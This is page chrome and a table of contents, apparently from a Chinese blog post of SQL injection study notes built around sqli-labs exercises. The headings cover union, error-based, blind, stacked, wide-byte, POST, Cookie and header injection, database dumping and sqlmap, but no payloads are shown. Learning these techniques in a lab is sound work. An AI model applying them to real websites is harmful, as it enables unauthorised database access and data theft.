href="/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 0.88rem;">刷题记录<sup>3</sup></a><a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.88rem;">杂项<sup>1</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">测试<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/playlist?id=360062344&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">SQL 注入学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">SQL 注入概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E9%A1%B5%E9%9D%A2%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">Web 页面类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">动态网站工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E8%B5%B7%E6%BA%90"><span class="toc-number">1.1.4.</span> <span class="toc-text">SQL 注入起源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%85%B8%E5%9E%8B%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="toc-number">1.1.5.</span> <span class="toc-text">SQL 注入典型攻击手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.6.</span> <span class="toc-text">SQL 注入危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">SQL 注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">按注入点类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">按数据提交方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C"><span class="toc-number">1.2.3.</span> <span class="toc-text">按执行效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">SQL 注入常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">MySQL 系统信息函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.</span> <span class="toc-text">字符串操作函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">注释方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.4.</span> <span class="toc-text">联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. 判断是否存在 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. 判断闭合字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-number">1.4.3.</span> <span class="toc-text">3. 判断列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.4.4.</span> <span class="toc-text">4. 确定回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.4.5.</span> <span class="toc-text">5. 查询数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-number">1.4.6.</span> <span class="toc-text">6. 查询表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.4.7.</span> <span class="toc-text">7. 查询字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">1.4.8.</span> <span class="toc-text">8. 查询数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.5.1.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml"><span class="toc-number">1.5.2.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%A4%BA%E4%BE%8B%EF%BC%88%E5%AE%8C%E6%95%B4-URL%EF%BC%89"><span class="toc-number">1.5.3.</span> <span class="toc-text">报错注入示例（完整 URL）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#limit-substr-%E9%99%90%E5%88%B6%E8%BE%93%E5%87%BA"><span class="toc-number">1.5.4.</span> <span class="toc-text">limit &#x2F; substr 限制输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.6.2.</span> <span class="toc-text">本地测试示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="toc-number">1.6.3.</span> <span class="toc-text">求数据库长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%90%E5%AD%97%E6%AF%8D%E7%88%86%E7%A0%B4"><span class="toc-number">1.6.4.</span> <span class="toc-text">逐字母爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%A4%BA%E4%BE%8B%EF%BC%9Asecurity-%E5%BA%93"><span class="toc-number">1.6.5.</span> <span class="toc-text">完整示例：security 库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="toc-number">1.6.5.1.</span> <span class="toc-text">库长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%93%E5%90%8D%E7%AC%AC%E4%B8%80%E4%BD%8D"><span class="toc-number">1.6.5.2.</span> <span class="toc-text">库名第一位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%A1%A8%E6%95%B0%E9%87%8F"><span class="toc-number">1.6.5.3.</span> <span class="toc-text">查表数量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E9%95%BF%E5%BA%A6"><span class="toc-number">1.6.5.4.</span> <span class="toc-text">第一个表长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E7%AC%AC%E4%B8%80%E4%BD%8D%E5%AD%97%E6%AF%8D"><span class="toc-number">1.6.5.5.</span> <span class="toc-text">第一个表第一位字母</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%A1%A8%E7%AC%AC%E4%B8%80%E4%BD%8D%E5%AD%97%E6%AF%8D"><span class="toc-number">1.6.5.6.</span> <span class="toc-text">第二个表第一位字母</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5-emails-%E8%A1%A8%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F"><span class="toc-number">1.6.5.7.</span> <span class="toc-text">查 emails 表字段数量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6"><span class="toc-number">1.6.5.8.</span> <span class="toc-text">查第一个字段长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%AA%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%AC%AC%E4%B8%80%E4%BD%8D"><span class="toc-number">1.6.5.9.</span> <span class="toc-text">截取第一个字段第一位</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%EF%BC%9Aif-sleep"><span class="toc-number">1.7.1.</span> <span class="toc-text">核心：if() + sleep()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-1"><span class="toc-number">1.7.2.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6-1"><span class="toc-number">1.7.3.</span> <span class="toc-text">求数据库长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%90%E5%AD%97%E6%AF%8D%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.7.4.</span> <span class="toc-text">逐字母爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%A4%BA%E4%BE%8B%EF%BC%9Asecurity-%E5%BA%93-1"><span class="toc-number">1.7.5.</span> <span class="toc-text">完整示例：security 库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%93%E9%95%BF%E5%BA%A6-1"><span class="toc-number">1.7.5.1.</span> <span class="toc-text">库长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%93%E5%90%8D%E7%AC%AC%E4%B8%80%E4%BD%8D-1"><span class="toc-number">1.7.5.2.</span> <span class="toc-text">库名第一位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%A1%A8%E6%95%B0%E9%87%8F-1"><span class="toc-number">1.7.5.3.</span> <span class="toc-text">查表数量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E9%95%BF%E5%BA%A6-1"><span class="toc-number">1.7.5.4.</span> <span class="toc-text">第一个表长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E7%AC%AC%E4%B8%80%E4%BD%8D%E5%AD%97%E6%AF%8D-1"><span class="toc-number">1.7.5.5.</span> <span class="toc-text">第一个表第一位字母</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5-emails-%E8%A1%A8%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F-1"><span class="toc-number">1.7.5.6.</span> <span class="toc-text">查 emails 表字段数量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%AA%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%AC%AC%E4%B8%80%E4%BD%8D-1"><span class="toc-number">1.7.5.7.</span> <span class="toc-text">截取第一个字段第一位</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.8.</span> <span class="toc-text">堆叠查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.8.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88"><span class="toc-number">1.8.2.</span> <span class="toc-text">判断闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E5%BA%93%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.8.3.</span> <span class="toc-text">查库查表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE"><span class="toc-number">1.8.4.</span> <span class="toc-text">插入数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE"><span class="toc-number">1.8.5.</span> <span class="toc-text">删除数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE"><span class="toc-number">1.8.6.</span> <span class="toc-text">修改数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%EF%BC%88%E9%9C%80-secure-file-priv-%E5%85%81%E8%AE%B8%EF%BC%89"><span class="toc-number">1.8.7.</span> <span class="toc-text">读写文件（需 secure_file_priv 允许）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84-Less-%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.8.8.</span> <span class="toc-text">各 Less 闭合方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.9.1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.9.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88-1"><span class="toc-number">1.9.3.</span> <span class="toc-text">判断闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.4.</span> <span class="toc-text">验证注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-number">1.9.5.</span> <span class="toc-text">判断列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">1.9.6.</span> <span class="toc-text">确定回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93"><span class="toc-number">1.9.7.</span> <span class="toc-text">爆库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8"><span class="toc-number">1.9.8.</span> <span class="toc-text">爆表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%B1%E5%BA%93"><span class="toc-number">1.9.9.</span> <span class="toc-text">脱库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6"><span class="toc-number">1.9.10.</span> <span class="toc-text">通用绕过字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84-Less-%E5%AF%B9%E5%BA%94"><span class="toc-number">1.9.11.</span> <span class="toc-text">各 Less 对应</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.10.</span> <span class="toc-text">POST 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E7%82%B9"><span class="toc-number">1.10.1.</span> <span class="toc-text">特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.10.2.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11%EF%BC%9APOST-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%88%E2%80%99-%E9%97%AD%E5%90%88%EF%BC%89"><span class="toc-number">1.10.3.</span> <span class="toc-text">Less-11：POST 联合查询（’ 闭合）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88-2"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">判断闭合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0-1"><span class="toc-number">1.10.3.2.</span> <span class="toc-text">判断列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D-1"><span class="toc-number">1.10.3.3.</span> <span class="toc-text">确定回显位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E8%A1%A8-1"><span class="toc-number">1.10.3.4.</span> <span class="toc-text">爆表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-number">1.10.3.5.</span> <span class="toc-text">爆列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%B1%E5%BA%93-1"><span class="toc-number">1.10.3.6.</span> <span class="toc-text">脱库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12%EF%BC%9A-%E9%97%AD%E5%90%88"><span class="toc-number">1.10.4.</span> <span class="toc-text">Less-12：) 闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13%EF%BC%9A-%E9%97%AD%E5%90%88-%E2%80%94-%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%8C%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.10.5.</span> <span class="toc-text">Less-13：&#39;) 闭合 — 无回显，用报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14%EF%BC%9A-%E9%97%AD%E5%90%88-%E2%80%94-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.10.6.</span> <span class="toc-text">Less-14：&quot; 闭合 — 无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15%EF%BC%9A%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.10.7.</span> <span class="toc-text">Less-15：布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16%EF%BC%9A-%E9%97%AD%E5%90%88-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.10.8.</span> <span class="toc-text">Less-16：&quot;) 闭合 + 布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17%EF%BC%9AUPDATE-%E6%B3%A8%E5%85%A5%EF%BC%88%E6%94%B9%E5%AF%86%E7%A0%81%E5%A4%84%EF%BC%89"><span class="toc-number">1.10.9.</span> <span class="toc-text">Less-17：UPDATE 注入（改密码处）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E9%80%9F%E6%9F%A5"><span class="toc-number">1.10.10.</span> <span class="toc-text">POST 注入工具速查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.11.</span> <span class="toc-text">Cookie 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.11.1.</span> <span class="toc-text">Cookie 是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-%E6%B3%A8%E5%85%A5%E8%AF%86%E5%88%AB%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.11.2.</span> <span class="toc-text">Cookie 注入识别步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E7%82%B9-1"><span class="toc-number">1.11.3.</span> <span class="toc-text">特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88-3"><span class="toc-number">1.11.4.</span> <span class="toc-text">判断闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.11.5.</span> <span class="toc-text">查数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%B1%E5%BA%93-2"><span class="toc-number">1.11.6.</span> <span class="toc-text">脱库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-%E6%B3%A8%E5%85%A5-Cookie"><span class="toc-number">1.11.7.</span> <span class="toc-text">sqlmap 注入 Cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.12.</span> <span class="toc-text">HTTP 头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.12.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%BB%93%E6%9E%84"><span class="toc-number">1.12.2.</span> <span 